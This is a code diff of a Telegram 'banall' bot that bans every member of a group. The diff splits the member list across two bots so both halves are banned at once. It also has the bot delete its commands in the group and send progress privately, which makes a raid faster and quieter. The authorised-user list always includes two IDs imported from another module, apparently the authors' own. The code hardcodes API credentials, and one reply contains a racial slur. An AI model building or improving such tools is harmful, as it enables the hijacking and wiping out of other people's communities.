@@ -2,167 +2,182 @@
 # Dear Pero ppls Plish Don't remove this line from here🌚
 # created by ItsmeHyper13
 import logging
-import re
 import os
 import sys, platform
 from asyncio import sleep
+import asyncio
 from os import getenv
 from dotenv import load_dotenv
 from telethon import TelegramClient, events, Button
-import telethon.utils
-from telethon.tl import functions
-from telethon.tl.functions.channels import LeaveChannelRequest
+from telethon.tl.functions.channels import LeaveChannelRequest, EditBannedRequest
+from telethon.tl.types import ChatBannedRights
 from telethon import __version__ as tel
 from str import dad as gg, dady as g, startxt2, startxt, hlptxt
-from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins, ChatAdminRights
-from telethon.tl.functions.channels import EditBannedRequest
 from datetime import datetime
 
 #Logging...
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
 )
+
 API_ID = int(getenv("API_ID", "4110592"))
 API_HASH = getenv("API_HASH", "aa7c849566922168031b95212860ede0")
 BOT_TOKEN = getenv("BOT_TOKEN", None)
+BOT_TOKEN_2 = getenv("BOT_TOKEN_2", None) 
 OWNER_ID = getenv("OWNER_ID", None)
-OP  = [int(g), int(gg), int(OWNER_ID)]
+OP  = [int(g), int(gg), int(OWNER_ID)] if OWNER_ID else [int(g), int(gg)]
 
-#TelegramClient..
-sree = TelegramClient(
-    "BanAll",
-    api_id=API_ID,
-    api_hash=API_HASH
-).start(bot_token=BOT_TOKEN)
+bot1 = TelegramClient("Bot1", api_id=API_ID, api_hash=API_HASH)
+bot2 = TelegramClient("Bot2", api_id=API_ID, api_hash=API_HASH)
 
 Owner = "https://t.me/ALONE_WAS_BOT"
 repo = "https://github.com/TeamAloneOp/AloneXBanallBot/fork"
 
-@sree.on(events.NewMessage(pattern="^/start"))
+@bot1.on(events.NewMessage(pattern="^/start"))
 async def start(event):
+    if event.is_group:
+        await event.delete() # Group-la command potta delete pannidum
+        
     buttns = [Button.url("••ѕυρροяτ••", "https://t.me/MUSIC_BOT_WORLD"), Button.url("••ʀєρο••", f'{repo}')]
     py = platform.python_version()
+    
     if event.sender.id in OP:
-        await sree.send_file(
-            event.chat.id,
+        await bot1.send_file(
+            event.sender_id, # DM-ku anuppum
             file="https://telegra.ph//file/9e8ce3092848a1bc5d9d6.jpg",
-            caption=startxt.format(
-                event.sender.first_name,
-                event.sender.id,
-                py,
-                tel,
-                Owner,
-            ),
+            caption=startxt.format(event.sender.first_name, event.sender.id, py, tel, Owner),
             link_preview=False,
             buttons=buttns
         )
-    if event.sender.id not in OP:
-        await sree.send_file(
-            event.chat.id,
+    else:
+        await bot1.send_file(
+            event.sender_id,
             file="https://telegra.ph//file/9e8ce3092848a1bc5d9d6.jpg",
-            caption=startxt2.format(
-                event.sender.first_name,
-                event.sender.id,
-                py,
-                tel,
-                Owner,
-            ),
+            caption=startxt2.format(event.sender.first_name, event.sender.id, py, tel, Owner),
             link_preview=False,
             buttons=buttns
         )
 
-@sree.on(events.NewMessage(pattern="^/help"))
+@bot1.on(events.NewMessage(pattern="^/help"))
 async def start(event):
+    if event.is_group:
+        await event.delete()
+        
     buttns = [Button.url("••ѕυρροяτ••", "https://t.me/MUSIC_BOT_WORLD"), Button.url("••ʀєρο••", f'{repo}')]
-    py = platform.python_version()
     if event.sender.id in OP:
-        await sree.send_file(
-            event.chat.id,
+        await bot1.send_file(
+            event.sender_id,
             file="https://telegra.ph//file/9e8ce3092848a1bc5d9d6.jpg",
             caption=hlptxt.format(event.sender.first_name, event.sender.id),
             link_preview=False,
             buttons=buttns
         )
-    if event.sender.id not in OP:
-        await event.reply(
-            "Huh Nigga!\nThis is not for you lol 😑\n\nMake your own bot from this [Repository⚡](https://github.com/denki307/banallx)",
-            link_preview=False,
-        )       
+    else:
+        await bot1.send_message(event.sender_id, "Huh Nigga!\nThis is not for you lol 😑\n\nMake your own bot from this [Repository⚡](https://github.com/denki307/banallx)", link_preview=False)       
 
-@sree.on(events.NewMessage(pattern="^/ping"))
+@bot1.on(events.NewMessage(pattern="^/ping"))
 async def ping(event):
+    if event.is_group:
+        await event.delete()
+        
     if event.sender.id in OP:
         start = datetime.now()
-        t = "Pinging..."
-        txxt = await event.reply(t)
+        txxt = await bot1.send_message(event.sender_id, "Pinging...")
         end = datetime.now()
         ms = (end-start).microseconds / 1000
         await txxt.edit(f"γєαн ι αм αℓιϐє 🔥!!\n\nριиg ροиg 🏓\n   ➥ `{ms} ms`")
 
-@sree.on(events.NewMessage(pattern="^/banall"))
-async def bun(event):
-  if event.sender.id in OP:
-   if not event.is_group:
-        Rep = f"__Brush Are You Serious 🙄.\nUse This Command In Any Group!!__"
-        await event.reply(Rep)
-   else:
-       await event.delete()
-       cht = await event.get_chat()
-       boss = await event.client.get_me()
-       admin = cht.admin_rights
-       creator = cht.creator
-       if not admin and not creator:
-           await event.reply("__I Don't Have Sufficient Rights To Do This.__")
-           return
-       hmm =  await event.reply("__Ye Bilek Migic Begins🥳...__")
-       await sleep(18)
-       await hmm.delete()
-       everyone = await event.client.get_participants(event.chat_id)
-       for user in everyone:
-           if user.id == boss.id:
-               pass
-           try:
-               await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None,view_messages=True)))
-           except Exception as e:
-               print(f"Error banning {user.id}: {e}") # Idhu thaan mathiyirukka line
-           await sleep(0.3)
-
-@sree.on(events.NewMessage(pattern="^/restart"))
-async def restart(jnl):
-    if jnl.sender.id in OP:
-        tct = "__Wait Restarting...__"
-        await jnl.reply(tct)
+async def ban_task(client, users, chat_id, boss_id):
+    for user in users:
+        if user.id == boss_id:
+            continue
         try:
-            await sree.disconnect()
+            await client(EditBannedRequest(chat_id, int(user.id), ChatBannedRights(until_date=None, view_messages=True)))
+        except Exception as e:
+            print(f"Error banning {user.id} via {client.session.filename}: {e}")
+        await sleep(0.3)
+
+@bot1.on(events.NewMessage(pattern="^/banall"))
+async def bun(event):
+    if event.sender.id in OP:
+        if not event.is_group:
+            await bot1.send_message(event.sender_id, "__Brush Are You Serious 🙄.\nUse This Command In Any Group!!__")
+            return
+        
+        await event.delete() # Group-la irundhu command delete aagidum
+        cht = await event.get_chat()
+        
+        if not cht.admin_rights and not cht.creator:
+            await bot1.send_message(event.sender_id, f"__I Don't Have Sufficient Rights To Do This in {cht.title}.__")
+            return
+            
+        # DM-la update varum
+        hmm = await bot1.send_message(event.sender_id, f"__Ye Bilek Migic Begins with Dual Bots in {cht.title} 🥳...__")
+        
+        everyone = await bot1.get_participants(event.chat_id)
+        bot1_me = await bot1.get_me()
+        bot2_me = await bot2.get_me()
+        
+        mid = len(everyone) // 2
+        half1 = everyone[:mid]
+        half2 = everyone[mid:]
+        
+        print(f"Starting dual ban... Bot 1: {len(half1)} members, Bot 2: {len(half2)} members")
+        
+        await asyncio.gather(
+            ban_task(bot1, half1, event.chat_id, bot1_me.id),
+            ban_task(bot2, half2, event.chat_id, bot2_me.id)
+        )
+        
+        # Ban mudinjathum DM-la message anuppum
+        await bot1.send_message(event.sender_id, f"**Ban Completed in {cht.title}!** ✅")
+
+@bot1.on(events.NewMessage(pattern="^/restart"))
+async def restart(jnl):
+    if jnl.is_group:
+        await jnl.delete()
+        
+    if jnl.sender.id in OP:
+        await bot1.send_message(jnl.sender_id, "__Wait Restarting...__")
+        try:
+            await bot1.disconnect()
+            await bot2.disconnect()
         except Exception:
             pass
         os.execl(sys.executable, sys.executable, *sys.argv)
         quit()
 
-@sree.on(events.NewMessage(pattern="^/leave"))
+@bot1.on(events.NewMessage(pattern="^/leave"))
 async def leave(z):
+    if z.is_group:
+        await z.delete()
+        
     if z.sender.id in OP:
         mkc = ("".join(z.text.split(maxsplit=1)[1:])).split(" ", 1)
         if len(z.text) > 7:
             mkb = int(mkc[0])
-            tet = "__Wait Leaving...__"
-            hm = await z.reply(tet)
+            hm = await bot1.send_message(z.sender_id, "__Wait Leaving...__")
             try:
-                await z.client(LeaveChannelRequest(mkb))
-                await hm.edit("**Succesfully Lefted!!**")
+                await bot1(LeaveChannelRequest(mkb))
+                await hm.edit("**Bot 1 Succesfully Lefted!!**")
             except Exception as e:
                 await hm.edit(str(e))
         else:
             mkb = z.chat_id
-            txt = "__Wait Leaving...__"
-            ok = await z.reply(txt)
+            ok = await bot1.send_message(z.sender_id, "__Wait Leaving...__")
             try:
-                await z.client(LeaveChannelRequest(mkb))
-                await ok.edit("**Succesfully Lefted!!**")
+                await bot1(LeaveChannelRequest(mkb))
+                await bot2(LeaveChannelRequest(mkb))
+                await ok.edit("**Both Bots Succesfully Lefted!!**")
             except Exception as e:
-                await z.edit(str(e))
+                await ok.edit(str(e))
 
-print("Alone Banall Bot  Deployed Successfully ✅")
+bot1.start(bot_token=BOT_TOKEN)
+if BOT_TOKEN_2:
+    bot2.start(bot_token=BOT_TOKEN_2)
+    print("Dual Bots Deployed Successfully ✅")
+else:
+    print("Bot 2 Token missing! Running single bot only. Add BOT_TOKEN_2 in env.")
 print("Join @AlonesHeaven if you facing any kind of issue!!")
 
-sree.run_until_disconnected()
+asyncio.get_event_loop().run_forever()
